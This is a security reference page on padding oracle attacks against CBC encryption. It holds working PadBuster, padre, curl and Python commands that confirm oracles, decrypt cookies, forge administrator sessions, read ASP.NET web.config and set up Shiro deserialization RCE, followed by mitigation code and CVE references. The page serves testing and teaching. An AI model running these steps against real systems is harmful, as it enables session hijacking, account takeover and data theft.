---
title: Padding Oracle Attacks
---

# Padding Oracle Attacks

A Padding Oracle Attack is a chosen-ciphertext attack that allows an attacker to decrypt — and even re-encrypt — arbitrary ciphertext without knowing the encryption key. It works against block ciphers running in CBC mode with PKCS#7 padding by exploiting a single information leak: whether the padding of a submitted ciphertext is valid or not.

The "oracle" is any application behavior that distinguishes valid padding from invalid padding — an error message, a different HTTP status code, a response-size delta, or a timing difference. Max cost to recover one byte: 256 requests.

## Understanding the Basics

### CBC Mode & PKCS#7 Padding

In CBC decryption, each plaintext block is derived by decrypting the ciphertext block then XORing with the **previous** ciphertext block (or IV for block 1):

```
P[n] = Decrypt(C[n]) XOR C[n-1]
```

PKCS#7 padding fills the last block to the block boundary by repeating the number of padding bytes:

```
1 byte  short: ...XX \x01
2 bytes short: ...XX \x02\x02
3 bytes short: ...XX \x03\x03\x03
Full block:    \x10 * 16  (entire extra block of padding)
```

If the decrypted last block does not end with valid PKCS#7 — the application signals an error. That signal is the oracle.

### The Oracle Signal Types

| Signal Type | Example |
| --- | --- |
| Explicit error message | `"Invalid padding"`, `"Decryption failed"`, `"Bad data"` |
| HTTP status difference | `200 OK` (valid padding) vs `500 Internal Server Error` (invalid) |
| Response body/length delta | Different page content or length on padding error |
| Redirect difference | Redirect to login vs stay on page |
| Timing side-channel | Valid padding processes faster or slower than invalid |

## Attack Surface

- **Encrypted session cookies** — CBC-encrypted auth tokens sent back to the server for decryption
- **ASP.NET ViewState / WebResource.axd** — CBC-encrypted ViewState leaks padding validity via HTTP 500 vs 200 (CVE-2010-3332)
- **"Remember Me" cookies** — Long-lived encrypted tokens decrypted server-side (Apache Shiro — CBC AES-128)
- **Encrypted URL parameters / query strings** — Token passed as `?data=<ciphertext>` decrypted on each request
- **Encrypted form fields** — Hidden fields containing server-encrypted state
- **API tokens & JWT with CBC encryption** — Non-standard JWTs using AES-CBC instead of AEAD
- **VPN / TLS with CBC ciphersuites** — POODLE (SSL 3.0), Lucky Thirteen (TLS 1.0–1.2)

## Exploiting Padding Oracle Attacks

### 1. Identifying the Oracle

Before exploiting, confirm the oracle exists. Intercept a request carrying an encrypted value, flip a single byte in the last block, and observe the response differential.

```bash
# Step 1 — Capture baseline (valid ciphertext)
curl -s -o baseline.html -w "%{http_code}" \
  -b "auth=RVJDQrwUdTRWJUVUeBKkEA==" \
  https://target.com/dashboard

# Step 2 — Flip last byte of ciphertext (Base64 decode → modify → re-encode)
python3 -c "
import base64
ct = base64.b64decode('RVJDQrwUdTRWJUVUeBKkEA==')
ct = bytearray(ct)
ct[-1] ^= 0x01           # flip last byte
print(base64.b64encode(bytes(ct)).decode())
"
# → modified token

# Step 3 — Submit modified token
curl -s -o modified.html -w "%{http_code}" \
  -b "auth=<modified_token>" \
  https://target.com/dashboard

# Compare: different status code or body = oracle confirmed
diff baseline.html modified.html
```

Oracle confirmed if:

```
Valid ciphertext   → HTTP 200 / redirect to dashboard
Modified ciphertext → HTTP 500 "Invalid padding" / redirect to error
```

### 2. Decrypting Ciphertext with PadBuster

PadBuster automates byte-by-byte CBC decryption using the padding oracle.

```bash
# Decrypt a session cookie (Base64, block size 8)
padbuster http://target.com/index.php \
  "RVJDQrwUdTRWJUVUeBKkEA==" 8 \
  -encoding 0 \
  -cookies "auth=RVJDQrwUdTRWJUVUeBKkEA=="

# If the padding error message is known, specify it explicitly
padbuster http://target.com/index.php \
  "RVJDQrwUdTRWJUVUeBKkEA==" 8 \
  -encoding 0 \
  -cookies "auth=RVJDQrwUdTRWJUVUeBKkEA==" \
  -error "Invalid padding"

# Hex-encoded ciphertext (block size 16, lowercase hex encoding)
padbuster "http://target.com/echo?cipher=6b664ef0359fe233e021ad36b12d8e32" \
  "6b664ef0359fe233e021ad36b12d8e32" 16 \
  -encoding 1
```

Encoding options: `0` = Base64, `1` = lowercase hex, `2` = uppercase hex, `3` = .NET UrlToken, `4` = WebSafe Base64

### 3. Privilege Escalation via CBC-R (Forging Arbitrary Plaintext)

Once decryption is possible, CBC-R lets the attacker **encrypt** arbitrary plaintext without the key — enabling cookie/session forgery and privilege escalation.

```bash
# Decrypt to confirm current plaintext: "user=regularuser"
# Then re-encrypt with forged value: "user=administrator"
padbuster http://target.com/index.php \
  "RVJDQrwUdTRWJUVUeBKkEA==" 8 \
  -encoding 0 \
  -cookies "auth=RVJDQrwUdTRWJUVUeBKkEA==" \
  -plaintext "user=administrator"
# Output: new ciphertext that decrypts to "user=administrator"
# Submit this as the auth cookie → logged in as administrator
```

```bash
# padre — modern Go-based tool with auto-fingerprinting
# Decrypt
padre -u 'https://target.com/profile' \
  -cookie 'SESS=$' \
  'Gw3kg8e3ej4ai9wffn/d0uRqKzyaPfM2UFq/8dWmoW4wnyKZhx07Bg=='

# Encrypt arbitrary plaintext (privilege escalation)
padre -u 'https://target.com/profile' \
  -cookie 'SESS=$' \
  -enc '{"user_id": 1, "is_admin": true}'
# Submit output cookie → admin access
```

### 4. ASP.NET ViewState / WebResource.axd (CVE-2010-3332)

ASP.NET leaks padding validity via `WebResource.axd`: HTTP 500 = invalid padding, HTTP 200/404 = valid. This enables decryption of ViewState and retrieval of `web.config`.

```bash
# Identify WebResource.axd ciphertext from page HTML source
# Look for: <script src="/WebResource.axd?d=<ciphertext>&t=...">

# Decrypt the WebResource parameter
padbuster "http://target.com/WebResource.axd?d=CIPHERTEXT&t=TIMESTAMP" \
  "CIPHERTEXT" 16 \
  -encoding 3 \
  -noiv

# Retrieve web.config (requires .NET 3.5 SP1+)
padbuster "http://target.com/ScriptResource.axd?d=CIPHERTEXT&t=TIMESTAMP" \
  "CIPHERTEXT" 16 \
  -encoding 3 \
  -plaintext "~/web.config"
```

Oracle fingerprint:

```
GET /WebResource.axd?d=<valid_ciphertext>   → HTTP 200
GET /WebResource.axd?d=<modified_ciphertext> → HTTP 500   ← oracle confirmed
```

### 5. Apache Shiro "RememberMe" Cookie (CBC AES-128)

Apache Shiro ≤ 1.4.1 encrypts the `rememberMe` cookie with AES-128-CBC, which makes it vulnerable to a padding oracle attack (**CVE-2019-12422**, "Shiro-721"). Because CBC is used, the attack works **even when the encryption key is unknown or randomly generated** — the attacker uses a valid `rememberMe` cookie as the oracle prefix, brute-forces the padding to forge a ciphertext that decrypts to a malicious serialized object, and chains it with a Java deserialization gadget for RCE. Fixed in Shiro 1.4.2 (switched to AES-GCM).

> **Note:** the earlier *hardcoded default key* issue is a **separate** vulnerability — CVE-2016-4437 ("Shiro-550"), affecting Shiro ≤ 1.2.4. There, the publicly known key alone enables the deserialization RCE, so no padding oracle is needed. From Shiro 1.2.5 onward the key is randomly generated, which is precisely why Shiro-721 relies on the padding oracle instead.
> 

```bash
# Detect Shiro by response header (send any rememberMe value to trigger it)
curl -s -I -b "rememberMe=1" https://target.com/ | grep -i "rememberMe=deleteMe"
# If rememberMe=deleteMe appears in Set-Cookie → Shiro detected

# Confirm CBC padding oracle
python3 shiro_padding_oracle.py --url https://target.com/login \
  --cookie "rememberMe=<captured_cookie>"

# Decrypt the rememberMe cookie
padbuster https://target.com/ "<rememberMe_value>" 16 \
  -encoding 0 \
  -cookies "rememberMe=<rememberMe_value>"
```

### 6. Timing-Based Oracle (Lucky Thirteen / Blind)

When no explicit error is returned, measure response time — valid padding and invalid padding take different amounts of time to process due to MAC computation differences.

```python
import requests, time, base64, statistics

def timing_oracle(url, cookie_name, ciphertext):
    times = []
    for _ in range(5):    # average over 5 samples to reduce noise
        ct = bytearray(base64.b64decode(ciphertext))
        ct[-1] ^= 0x01    # flip last byte
        modified = base64.b64encode(bytes(ct)).decode()

        start = time.time()
        requests.get(url, cookies={cookie_name: modified})
        times.append(time.time() - start)

    return statistics.mean(times)

# Compare against the timing of the *unmodified* (valid) ciphertext:
invalid_time = timing_oracle('https://target.com/', 'session', 'VALID_CIPHERTEXT')
# If the modified ciphertext is consistently faster/slower than the valid one → timing oracle
print(f"Average response time with invalid padding: {invalid_time:.3f}s")
```

### Test Cases

| Scenario | Action | Expected Outcome |
| --- | --- | --- |
| Oracle Identification | Flip last byte of ciphertext; submit | Different HTTP status/body/length = oracle confirmed |
| Error Message Oracle | Submit corrupt ciphertext | `"Invalid padding"` / `"Bad data"` in response |
| Status Code Oracle | Tamper ciphertext on ASP.NET | HTTP 200 (valid) vs HTTP 500 (invalid padding) |
| Timing Oracle | Measure response time delta | Valid vs invalid padding shows measurable timing difference |
| Decryption | Run PadBuster against cookie | Plaintext of encrypted cookie recovered |
| Privilege Escalation | CBC-R forge `user=administrator` | New ciphertext decrypts to admin role; session elevated |
| Shiro Detection | Check `Set-Cookie` for `rememberMe=deleteMe` | Shiro confirmed; CBC oracle likely present |

## Detection Techniques (Offensive Perspective)

### Manual Detection — Confirming the Oracle

**Error Message Differential**

```bash
# Valid ciphertext
curl -s -o /dev/null -w "%{http_code}" \
  -b "session=RVJDQrwUdTRWJUVUeBKkEA==" https://target.com/
# → 200

# Tampered ciphertext (decode → XOR 0x01 on last byte → re-encode; see §1)
# Do NOT edit the Base64 text directly — changing padding chars alters the
# decoded length and produces a length error rather than a clean byte flip.
curl -s -o /dev/null -w "%{http_code}" \
  -b "session=<modified_token>" https://target.com/
# → 500  ← oracle confirmed
```

**Response Body Keyword Match**

```
Valid padding:    HTTP 200 / "Welcome" / redirect to /dashboard
Invalid padding:  HTTP 500 / "Invalid padding" / "Decryption error" / "Bad data"
                  "CryptographicException" / "PaddingException" / "EVP_DecryptFinal"
```

**Response Length Delta**

```bash
# Compare content length between valid and tampered ciphertext
valid_len=$(curl -s -b "session=VALID" https://target.com/ | wc -c)
tampered_len=$(curl -s -b "session=TAMPERED" https://target.com/ | wc -c)
echo "Valid: $valid_len | Tampered: $tampered_len"
# Different lengths = oracle confirmed
```

**Block Boundary Testing**

CBC block size is 8 or 16 bytes. Confirm by observing response changes at multiples:

```
Ciphertext length 8  → modify byte 8  → error
Ciphertext length 16 → modify byte 16 → error
If errors only at block boundaries → 8-byte blocks
If errors at 16-byte boundaries → 16-byte blocks (AES)
```

### Automated Detection

```bash
# padre — auto-fingerprints oracle and attempts decryption
padre -u 'https://target.com/page' \
  -cookie 'auth=$' \
  'ENCRYPTED_COOKIE_VALUE'
# padre automatically detects valid vs invalid padding responses
# and reports if a padding oracle is exploitable
```

```bash
# PadBuster auto-analysis mode — samples all response types
padbuster https://target.com/page "CIPHERTEXT" 8 \
  -encoding 0 \
  -cookies "auth=CIPHERTEXT"
# PadBuster presents response analysis table:
# Response 1: HTTP 200, Length 4821  ← valid padding
# Response 2: HTTP 500, Length 312   ← invalid padding
# Confirm ID: 2 → attack begins
```

```python
# Custom oracle probe — test all 256 last-byte values, map responses
import requests, base64

url = 'https://target.com/'
cookie_name = 'session'
valid_ct = base64.b64decode('RVJDQrwUdTRWJUVUeBKkEA==')

results = {}
for i in range(256):
    ct = bytearray(valid_ct)
    ct[-1] = i
    modified = base64.b64encode(bytes(ct)).decode()
    r = requests.get(url, cookies={cookie_name: modified})
    results[i] = (r.status_code, len(r.content))

# Count distinct response signatures
signatures = set(results.values())
print(f"Distinct responses: {len(signatures)}")
# 1 distinct response = no oracle
# 2 distinct responses = oracle confirmed (valid vs invalid padding)
```

## Impact

- **Full Plaintext Recovery** — Decrypt any ciphertext intercepted in transit or extracted from cookies/tokens without the key
- **Session Forgery & Account Takeover** — Decrypt session cookie → modify role/user field → re-encrypt → submit as valid session
- **Privilege Escalation** — CBC-R encryption of arbitrary plaintext (`user=admin`, `is_admin=true`) without key knowledge
- **Sensitive Data Exposure** — Decrypt encrypted ViewState, form fields, or API tokens revealing internal application state and PII
- **File Retrieval (ASP.NET)** — CVE-2010-3332 enables reading `web.config`, leaking `machineKey`, database credentials, and connection strings
- **RCE via Deserialization Chain** — Apache Shiro: padding oracle decryption + Java deserialization gadget chain → remote code execution

## Tools

| Tool | Purpose |
| --- | --- |
| PadBuster | Perl — automated CBC padding oracle decryption and plaintext encryption |
| padre | Go — fast modern padding oracle exploiter with auto-fingerprinting |
| python-paddingoracle | Python API — customizable oracle implementation for non-HTTP / unique encoding scenarios |
| Burp Suite (Intruder) | Manual byte-by-byte ciphertext manipulation and response comparison |
| POET | Python padding oracle exploitation tool |
| testssl.sh | Detect CBC ciphersuites and POODLE/Lucky13 vulnerability in TLS |
| Padding Oracle Hunter | Burp Suite extension (BApp Store) - GUI-based detection and exploitation of PKCS#7 CBC and PKCS#1 v1.5 RSA padding oracles; requires Jython |

## Mitigation & Prevention

1. **Use Authenticated Encryption (AEAD)** — Replace AES-CBC with AES-GCM or ChaCha20-Poly1305; AEAD verifies integrity before decryption - no padding oracle possible. Use high-level libraries rather than raw cipher primitives:

```php
   // PHP — XSalsa20-Poly1305 via libsodium (built-in since PHP 7.2)
   $key   = sodium_crypto_secretbox_keygen();            // 32-byte random key
   $nonce = random_bytes(SODIUM_CRYPTO_SECRETBOX_NONCEBYTES); // 24-byte nonce
   $ciphertext = sodium_crypto_secretbox($plaintext, $nonce, $key);
   // Decrypt + verify in one call:
   $plaintext  = sodium_crypto_secretbox_open($ciphertext, $nonce, $key);
   if ($plaintext === false) { throw new Exception("Decryption failed"); }
```

```python
   # Python — AES-128-CBC + HMAC-SHA256 (authenticated; safe against padding oracles)
   from cryptography.fernet import Fernet
   key   = Fernet.generate_key()
   f     = Fernet(key)
   token = f.encrypt(b"plaintext")       # encrypt + authenticate
   data  = f.decrypt(token)              # verify MAC then decrypt — raises on tamper

   # Alternative: XSalsa20-Poly1305 via PyNaCl (true AEAD)
   from nacl import secret, utils
   key = utils.random(secret.SecretBox.KEY_SIZE)
   box = secret.SecretBox(key)
   encrypted = box.encrypt(b"plaintext")
   plaintext = box.decrypt(encrypted)
```

```jsx
   // Node.js — AES-256-GCM via Web Crypto API
   // globalThis.crypto is a global since Node 19+ (stable in 20);
   // on Node 15–18 use: const { webcrypto } = require('crypto'); then webcrypto.subtle / webcrypto.getRandomValues
   const { subtle, getRandomValues } = globalThis.crypto;
   const key = await subtle.generateKey({ name: 'AES-GCM', length: 256 }, true, ['encrypt', 'decrypt']);
   const iv  = getRandomValues(new Uint8Array(12));  // 96-bit IV — do not reuse with same key
   const ciphertext = await subtle.encrypt({ name: 'AES-GCM', iv }, key, plaintext);
   // Auth tag is appended to ciphertext automatically; verified on decrypt
   const plaintext  = await subtle.decrypt({ name: 'AES-GCM', iv }, key, ciphertext);
```

```java
   // Java — AES-256-GCM
   SecretKey key = KeyGenerator.getInstance("AES").generateKey(); // use 256-bit key in prod
   byte[] iv = new byte[12];
   new SecureRandom().nextBytes(iv);
   Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
   cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
   byte[] ciphertext = cipher.doFinal(plaintext);
   // Auth tag (16 bytes) is appended; decryption throws AEADBadTagException on tamper
```

1. **Encrypt-then-MAC** — If CBC must be used, compute HMAC over the ciphertext and verify the MAC before attempting decryption; reject any ciphertext with invalid MAC without decrypting
2. **Generic Error Responses** — Return identical responses (body, status code, and timing) for all decryption failures — never distinguish padding errors from other errors
3. **Constant-Time Comparisons** — Use timing-safe comparison functions for MAC verification to prevent timing side-channel oracles
4. **Disable CBC Ciphersuites in TLS** — Enforce TLS 1.3 (AEAD-only); disable SSLv3, TLS 1.0 CBC suites to eliminate POODLE and Lucky Thirteen
5. **Upgrade Vulnerable Frameworks** — Apache Shiro ≥ 1.4.2 (AES-GCM); ASP.NET patched builds post CVE-2010-3332; avoid default/hardcoded encryption keys

## Good To Read

### Notable CVEs & Incidents

- [**CVE-2010-3332](https://nvd.nist.gov/vuln/detail/CVE-2010-3332) — ASP.NET:** Padding oracle via `WebResource.axd` enables decryption of ViewState and retrieval of `web.config`. Affected all ASP.NET versions at the time.
- [**CVE-2014-3566](https://nvd.nist.gov/vuln/detail/cve-2014-3566) — POODLE:** Padding oracle combined with SSL 3.0 downgrade — ~256 requests to recover one byte of HTTPS session data.
- [**CVE-2013-0169](https://nvd.nist.gov/vuln/detail/cve-2013-0169) — Lucky Thirteen:** Timing-based padding oracle against TLS 1.0–1.2 CBC ciphersuites; affects OpenSSL, GnuTLS, NSS.
- [**CVE-2016-2107](https://nvd.nist.gov/vuln/detail/cve-2016-2107) — OpenSSL Lucky Thirteen patch bypass:** The fix itself introduced a new timing oracle.
- [**CVE-2019-12422](https://nvd.nist.gov/vuln/detail/cve-2019-12422) — Apache Shiro ("Shiro-721"):** `rememberMe` cookie uses AES-128-CBC; a padding oracle lets an attacker forge a valid encrypted serialized payload — chainable to Java deserialization RCE. Affects Shiro ≤ 1.4.1 (fixed in 1.4.2, which moved to AES-GCM). The attacker does **not** need to know the encryption key.
- [**CVE-2016-4437](https://nvd.nist.gov/vuln/detail/cve-2016-4437) — Apache Shiro ("Shiro-550"):** Hardcoded default AES key for `rememberMe` (Shiro ≤ 1.2.4) allows direct deserialization RCE with **no** padding oracle required — a distinct, earlier issue from Shiro-721.

### HackerOne Reports

- https://hackerone.com/reports/728110
- https://hackerone.com/reports/216746
- https://hackerone.com/reports/429966

## References

- [OWASP WSTG: Testing for Padding Oracle (WSTG-CRYP-02)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle)
- [HackTricks: Padding Oracle](https://hacktricks-wiki-hacktricks.mintlify.app/crypto/padding-oracle-attacks)
- [PortSwigger: CBC Bit Flipping & Padding Oracle](https://portswigger.net/web-security/logic-flaws/examples#providing-an-encryption-oracle)
- [PadBuster — AonCyberLabs](https://github.com/AonCyberLabs/PadBuster/pulls)
- [padre — glebarez](https://github.com/glebarez/padre)
- [Vaudenay, S. (2002): Security Flaws Induced by CBC Padding](https://www.torsten-schuetze.de/sommerakademie2009/papers-sekundaer/Vaudenay-CBC-Padding-Flaws-2002.pdf)
- [Robert Heaton: Padding Oracle Attack (2013)](https://robertheaton.com/2013/07/29/padding-oracle-attack/)
- https://pentesterlab.com/exercises/padding-oracle
- [flast101: Padding Oracle Attack](https://flast101.github.io/padding-oracle-attack-explained/)